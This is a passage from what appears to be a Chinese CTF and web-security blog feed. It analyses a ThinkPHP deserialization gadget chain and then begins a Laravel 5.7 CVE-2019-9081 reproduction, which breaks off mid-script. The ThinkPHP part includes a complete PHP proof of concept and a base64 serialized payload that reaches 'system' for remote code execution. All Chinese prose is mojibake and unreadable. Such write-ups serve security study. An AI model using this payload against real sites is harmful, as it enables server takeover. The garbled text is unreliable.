invoke__">file_exists</span>()`å‡½æ•°ï¼Œæ­¤å‡½æ•°ä¼šæŠŠå¯¹è±¡å½“å­—ç¬¦ä¸²ä½¿ç”¨ï¼Œäºæ˜¯åˆ©ç”¨`<span class="hljs-class"><span class="hljs-keyword">trait</span> <span class="hljs-title">Conversion</span>`çš„`<span class="hljs-title">__toString</span>()`ï¼Œä»¥å®ç°äº†æ­¤<span class="hljs-title">trait</span>çš„`<span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">Pivot</span>`æ¥å®ä¾‹åŒ–å¯¹è±¡ï¼Œå¹¶ç»è¿‡è°ƒè¯•æˆåŠŸè¿›å…¥æ­¤è¯­å¥`<span class="hljs-title">call_user_func_array</span>($<span class="hljs-title">this</span>-&gt;<span class="hljs-title">hook</span>[$<span class="hljs-title">method</span>], $<span class="hljs-title">args</span>);`</span><br></code></pre></td></tr></table></figure><p>ç¬¬äºŒæ³¢æ¢³ç†ï¼š</p><p>æˆ‘ä»¬å¯ä»¥è°ƒç”¨ä»»æ„å‡½æ•°ï¼Œä½†å‚æ•°ä¸å¯æ§ï¼Œäºæ˜¯éœ€è¦å¯»æ‰¾å…¶ä»–å‡½æ•°æ¥å®ç°ç›®çš„ã€‚</p><p>æƒ³åˆ©ç”¨<code>filterValue()</code>é‡Œçš„<code>call_user_func($filter, $value)</code>ï¼Œä½†ä¸¤ä¸ªå‚æ•°éƒ½ä¸å¯æ§ï¼Œå¾€ä¸Šå¯»æ‰¾å‡½æ•°ï¼Œçœ‹è°è°ƒç”¨æ­¤å‡½æ•°ï¼Œå¹¶å€Ÿæ­¤æ§åˆ¶å‚æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filterValue</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$value</span>, <span class="hljs-variable">$key</span>, <span class="hljs-variable">$filters</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$default</span> = <span class="hljs-title function_ invoke__">array_pop</span>(<span class="hljs-variable">$filters</span>);<br><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$filters</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$filter</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_callable</span>(<span class="hljs-variable">$filter</span>)) &#123;<br>            <span class="hljs-comment">// è°ƒç”¨å‡½æ•°æˆ–è€…æ–¹æ³•è¿‡æ»¤</span><br>            <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$filter</span>, <span class="hljs-variable">$value</span>);<br></code></pre></td></tr></table></figure><p>æ‰¾åˆ°<code>input()</code>å‡½æ•°ï¼Œå¹¶ä¸”<code>$filter</code>å¯æ§ï¼Œä½†<code>$data</code>ä¸å¯æ§ï¼Œç»§ç»­å¾€ä¸Šæ‰¾å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">input</span>(<span class="hljs-params"><span class="hljs-variable">$data</span> = [], <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$default</span> = <span class="hljs-literal">null</span>, <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<br>  Â·Â·Â·Â·Â·Â·<br>  <span class="hljs-variable">$filter</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getFilter</span>(<span class="hljs-variable">$filter</span>, <span class="hljs-variable">$default</span>);<br><br>       <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$data</span>)) &#123;<br>           <span class="hljs-title function_ invoke__">array_walk_recursive</span>(<span class="hljs-variable">$data</span>, [<span class="hljs-variable">$this</span>, <span class="hljs-string">&#x27;filterValue&#x27;</span>], <span class="hljs-variable">$filter</span>);<br>       Â·Â·Â·Â·Â·Â·Â·<br>&#125; <br><br></code></pre></td></tr></table></figure><p>æ‰¾åˆ°<code>param()</code>å‡½æ•°ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">param</span>(<span class="hljs-params"><span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$default</span> = <span class="hljs-literal">null</span>, <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>  Â·Â·Â·Â·Â·Â·<br>        <span class="hljs-comment">// å½“å‰è¯·æ±‚å‚æ•°å’ŒURLåœ°å€ä¸­çš„å‚æ•°åˆå¹¶</span><br>        <span class="hljs-variable language_">$this</span>-&gt;param = <span class="hljs-title function_ invoke__">array_merge</span>(<span class="hljs-variable">$this</span>-&gt;param, <span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-literal">false</span>), <span class="hljs-variable">$vars</span>, <span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">route</span>(<span class="hljs-literal">false</span>));<br><br>        <span class="hljs-variable language_">$this</span>-&gt;mergeParam = <span class="hljs-literal">true</span>;<br><br>Â·Â·Â·Â·Â·Â·Â·<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">input</span>(<span class="hljs-variable">$this</span>-&gt;param, <span class="hljs-variable">$name</span>, <span class="hljs-variable">$default</span>, <span class="hljs-variable">$filter</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>çœ‹ä¼¼å®Œç¾ï¼Œä½†æ˜¯ç”±äºæ­¤æ—¶<code> $this-&gt;input($this-&gt;param, $name, $default, $filter);</code>çš„ç¬¬äºŒä¸ªå‚æ•°ä¼šæ˜¯<code>[&quot;&quot;]</code>å‹ï¼Œåœ¨<code>input()</code>å‡½æ•°é‡Œå‰åŠæ®µä¼šå› ä¸º<code>$name=(string)$name</code>æŠ¥é”™ï¼Œå› æ­¤è¿˜è¦å¾€ä¸Šæ‰¾å‡½æ•°</p><p>æ‰¾åˆ°<code>isAjax</code>å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isAjax</span>(<span class="hljs-params"><span class="hljs-variable">$ajax</span> = <span class="hljs-literal">false</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$value</span>  = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">server</span>(<span class="hljs-string">&#x27;HTTP_X_REQUESTED_WITH&#x27;</span>);<br>    <span class="hljs-variable">$result</span> = <span class="hljs-string">&#x27;xmlhttprequest&#x27;</span> == <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$value</span>) ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span> === <span class="hljs-variable">$ajax</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>    &#125;<br><br>    <span class="hljs-variable">$result</span>           = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">param</span>(<span class="hljs-variable">$this</span>-&gt;config[<span class="hljs-string">&#x27;var_ajax&#x27;</span>]) ? <span class="hljs-literal">true</span> : <span class="hljs-variable">$result</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;mergeParam = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ååˆ†åˆé€‚ï¼Œå¯ä»¥æ§åˆ¶<code>$this-&gt;config[&#39;var_ajax&#39;]</code>ï¼Œä»è€Œæ§åˆ¶<code>param()</code>çš„ç¬¬ä¸€ä¸ªå‚æ•°<code>$name</code></p><p>è‡³æ­¤æ•´æ¡é“¾å­åˆ†æå®Œæ¯•ã€‚</p><h2 id="ç»¼åˆ"><a href="#ç»¼åˆ" class="headerlink" title="ç»¼åˆ"></a>ç»¼åˆ</h2><p>ä»å¤´å¤ç›˜ä¸€ä¸‹å§</p><p>èµ·ç‚¹ï¼šWindowç±»çš„<code>__destruct()</code></p><p>â€‹ è·³æ¿<code>file_exists()</code>ï¼Œåˆ©ç”¨<code>__toString()</code></p><p>è·³ç‚¹1:<code>trait Conversion</code>ï¼Œ</p><p>â€‹è·³æ¿<code>$relation-&gt;visible([$attr]);</code>åˆ©ç”¨<code>__call()</code></p><p>è·³ç‚¹2:<code>think\Request</code>ï¼Œ</p><p>â€‹è·³æ¿<code>call_user_func_array($this-&gt;hook[$method], $args)</code>ï¼Œåˆ©ç”¨ä»»æ„å‡½æ•°æ‰§è¡Œ</p><p>è·³ç‚¹3:<code>think\Request</code>çš„ function isAjax($ajax &#x3D; false)</p><p>â€‹è·³æ¿<code>$this-&gt;param($this-&gt;config[&#39;var_ajax&#39;]) ? true : $result</code>ï¼Œåˆ©ç”¨<code>param()</code>ï¼Œ<code>$this-&gt;config</code></p><p>è·³ç‚¹4:<code>think\Request</code>çš„<code> function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)</code></p><p>â€‹è·³æ¿<code>$this-&gt;input($this-&gt;param, $name, $default, $filter)</code>ï¼Œåˆ©ç”¨<code>input()</code>ï¼Œ<code>$this-&gt;param</code></p><p>è·³ç‚¹5:<code>think\Request</code>çš„<code>function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)</code></p><p>â€‹è·³æ¿<code>array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);</code>ï¼Œåˆ©ç”¨<code> filterValue</code></p><p>ç»ˆç‚¹:<code>think\Request</code>çš„<code>function filterValue(&amp;$value, $key, $filters)</code></p><p>â€‹åˆ©ç”¨ <code> $value = call_user_func($filter, $value);</code>è¿›è¡ŒRCE</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">process</span>\<span class="hljs-title class_">pipes</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>\<span class="hljs-title class_">Pivot</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Windows</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;files[] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pivot</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">Request</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$append</span> = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$data</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$request</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Request</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;append = [<span class="hljs-string">&#x27;0.&#x27;</span>];<br>            <span class="hljs-variable language_">$this</span>-&gt;data = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$request</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Request</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">hook</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filter</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$config</span> = [<span class="hljs-string">&#x27;var_ajax&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>];<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;hook[<span class="hljs-string">&#x27;visible&#x27;</span>] = [<span class="hljs-variable language_">$this</span>,<span class="hljs-string">&#x27;isAjax&#x27;</span>];<br>            <span class="hljs-variable language_">$this</span>-&gt;filter = <span class="hljs-string">&#x27;system&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br><br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">process</span>\<span class="hljs-title class_">pipes</span>\<span class="hljs-title class_">Windows</span>;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Windows</span>()));<br>&#125;<br><br><span class="hljs-comment">// TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7aTowO3M6MjoiMC4iO31zOjc6IgAqAGRhdGEiO2E6MTp7aTowO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e3M6NzoiACoAaG9vayI7YToxOntzOjc6InZpc2libGUiO2E6Mjp7aTowO3I6NztpOjE7czo2OiJpc0FqYXgiO319czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjtzOjk6IgAqAGNvbmZpZyI7YToxOntzOjg6InZhcl9hamF4IjtzOjA6IiI7fX19fX19</span><br><br></code></pre></td></tr></table></figure><p>![](img&#x2F;æˆªå±2023-10-08 20.32.33.png)</p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><ul><li>è¿™æ¡é“¾å­è¦æ¯”ä¹‹å‰çš„yii2å’Œlaravelè¦é•¿çš„å¤šï¼Œè°ƒè¯•èµ·æ¥ä¹Ÿè€—æ—¶å¾ˆä¹…ã€‚ä½†æ˜¯æœ€ç»ˆå†™å‡ºæ¥ã€æ•´ç†å‡ºæ¥çš„æˆå°±æ„Ÿè¿˜æ˜¯å¾ˆä¸é”™çš„</li><li>é€šè¿‡è¿™é¢˜ä¹Ÿæ›´ç†Ÿç»ƒæŒæ¡äº†IDEAè°ƒè¯•æ–¹å¼ï¼Œå¯¹äºpopé“¾æ„é€ ä¹Ÿæœ‰æ›´å¥½çš„è®¤è¯†</li><li>é“¾å­éšé•¿ï¼Œä¸€æ­¥ä¸€æ­¥å¤ç°å‡ºæ¥å…¶å®ä¹Ÿå°±é‚£ä¹ˆå›äº‹å„¿ï½</li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Web</category>
      
      <category>unserialize</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>unserialize</tag>
      
      <tag>cve</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Laravel_5.7.* ååºåˆ—åŒ–å¤ç°</title>
    <link href="/2023/10/07/Laravel/"/>
    <url>/2023/10/07/Laravel/</url>
    
    <content type="html"><![CDATA[<p>CVE-2019-9081 å¤ç°</p><span id="more"></span><h1 id="ååºåˆ—åŒ–é“¾åˆ†æ"><a href="#ååºåˆ—åŒ–é“¾åˆ†æ" class="headerlink" title="ååºåˆ—åŒ–é“¾åˆ†æ"></a>ååºåˆ—åŒ–é“¾åˆ†æ</h1><h2 id="1-å…¥å£"><a href="#1-å…¥å£" class="headerlink" title="1. å…¥å£"></a>1. å…¥å£</h2><p>æ­¤ååºåˆ—åŒ–æ¼æ´å…¥å£ä½äº Illuminate\Foundation\Testing\PendingCommand destruct() æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"> </span>&#123;<br>     <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;hasExecuted) &#123;<br>         <span class="hljs-keyword">return</span>;<br>     &#125;<br>     <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">run</span>();<br> &#125;<br></code></pre></td></tr></table></figure><p>åˆ†æï¼š<code>$this-&gt;hasExecuted</code>é»˜è®¤ä¸ºfalseä¸æ‰§è¡Œï¼Œæ‰€ä»¥ä¼šç›´æ¥æ‰§è¡Œ<code>  $this-&gt;run()</code>æ–¹æ³•ï¼ŒæŸ¥é˜…<code>run()</code>æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">   </span>&#123;<br>       <span class="hljs-variable language_">$this</span>-&gt;hasExecuted = <span class="hljs-literal">true</span>;<br><br>       <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">mockConsoleOutput</span>();<br><br>       <span class="hljs-keyword">try</span> &#123;<br>           <span class="hljs-variable">$exitCode</span> = <span class="hljs-variable language_">$this</span>-&gt;app[<span class="hljs-title class_">Kernel</span>::<span class="hljs-variable language_">class</span>]-&gt;<span class="hljs-title function_ invoke__">call</span>(<span class="hljs-variable">$this</span>-&gt;command, <span class="hljs-variable">$this</span>-&gt;parameters);<br>       &#125; <span class="hljs-keyword">catch</span> (NoMatchingExpectationException <span class="hljs-variable">$e</span>) &#123;<br>           <span class="hljs-keyword">if</span> (<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMethodName</span>() === <span class="hljs-string">&#x27;askQuestion&#x27;</span>) &#123;<br>               <span class="hljs-variable language_">$this</span>-&gt;test-&gt;<span class="hljs-title function_ invoke__">fail</span>(<span class="hljs-string">&#x27;Unexpected question &quot;&#x27;</span>.<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getActualArguments</span>()[<span class="hljs-number">0</span>]-&gt;<span class="hljs-title function_ invoke__">getQuestion</span>().<span class="hljs-string">&#x27;&quot; was asked.&#x27;</span>);<br>           &#125;<br><br>           <span class="hljs-keyword">throw</span> <span class="hljs-variable">$e</span>;<br>       &#125;<br><br>       <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;expectedExitCode !== <span class="hljs-literal">null</span>) &#123;<br>           <span class="hljs-variable language_">$this</span>-&gt;test-&gt;<span class="hljs-title function_ invoke__">assertEquals</span>(<br>               <span class="hljs-variable">$this</span>-&gt;expectedExitCode, <span class="hljs-variable">$exitCode</span>,<br>               <span class="hljs-string">&quot;Expected status code <span class="hljs-subst">&#123;$this-&gt;expectedExitCode&#125;</span> but received <span class="hljs-subst">&#123;$exitCode&#125;</span>.&quot;</span><br>           );<br>       &#125;<br><br>       <span class="hljs-keyword">return</span> <span class="hljs-variable">$exitCode</span>;<br>   &#125;<br></code></pre></td></tr></table></figure><p>ä¼šå…ˆç»å†<code>mockConsoleOutput()</code>æ–¹æ³•ï¼ŒæŸ¥çœ‹è¯¥æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">mockConsoleOutput</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$mock</span> = <span class="hljs-title class_">Mockery</span>::<span class="hljs-title function_ invoke__">mock</span>(<span class="hljs-title class_">OutputStyle</span>::<span class="hljs-variable language_">class</span>.<span class="hljs-string">&#x27;[askQuestion]&#x27;</span>, [<br>        (<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayInput</span>(<span class="hljs-variable">$this</span>-&gt;parameters)), <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">createABufferedOutputMock</span>(),<br>    ]);<br><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;test-&gt;expectedQuestions <span class="hljs-keyword">as</span> <span class="hljs-variable">$i</span> =&gt; <span class="hljs-variable">$question</span>) &#123;<br>        <span class="hljs-variable">$mock</span>-&gt;<span class="hljs-title function_ invoke__">shouldReceive</span>(<span class="hljs-string">&#x27;askQuestion&#x27;</span>)<br>            -&gt;<span class="hljs-title function_ invoke__">once</span>()<br>            -&gt;<span class="hljs-title function_ invoke__">ordered</span>()<br>            -&gt;<span class="hljs-title function_ invoke__">with</span>(<span class="hljs-title class_">Mockery</span>::<span class="hljs-title function_ invoke__">on</span>(function (<span class="hljs-variable">$argument</span>) <span class="hljs-keyword">use</span> (<span class="hljs-variable">$question</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$argument</span>-&gt;<span class="hljs-title function_ invoke__">getQuestion</span>() == <span class="hljs-variable">$question</span>[<span class="hljs-number">0</span>];<br>            &#125;))<br>            -&gt;<span class="hljs-title function_ invoke__">andReturnUsing</span>(function () <span class="hljs-keyword">use</span> ($<span class="hljs-title">question</span>, $<span class="hljs-title">i</span>) &#123;<br>                <span class="hljs-title">unset</span>($<span class="hljs-title">this</span>-&gt;<span class="hljs-title">test</span>-&gt;<span class="hljs-title">expectedQuestions</span>[$<span class="hljs-title">i</span>]);<br><br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$question</span>[<span class="hljs-number">1</span>];<br>            &#125;);<br>    &#125;<br><br>    <span class="hljs-variable language_">$this</span>-&gt;app-&gt;<span class="hljs-title function_ invoke__">bind</span>(<span class="hljs-title class_">OutputStyle</span>::<span class="hljs-variable language_">class</span>, function () <span class="hljs-keyword">use</span> ($<span class="hljs-title">mock</span>) &#123;<br>        <span class="hljs-title">return</span> $<span class="hljs-title">mock</span>;<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¤§ä½“æ„æ€å°±æ˜¯å¯¹<code>$thie-&gt;test</code>å’Œ<code>$this-&gt;app</code>æˆå‘˜è¿›è¡Œåˆå§‹åŒ–</p><p>ç®€å•å†™ä¸ªè„šæœ¬è°ƒè¯•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Foundation</span>\<span class="hljs-title class_">Testing</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">Faker</span>\<span class="hljs-title class_">DefaultGenerator</span>;<br>    <span class="hljs-keyword">use</span>  <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Container</span>\<span class="hljs-title">Container</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PendingCommand</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$app</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$command</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$parameters</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$command</span>,<span class="hljs-variable">$parameters</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;command = <span class="hljs-variable">$command</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;parameters = <span class="hljs-variable">$parameters</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultGenerator</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;app = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultGenerator</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Faker</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">DefaultGenerator</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">default</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span 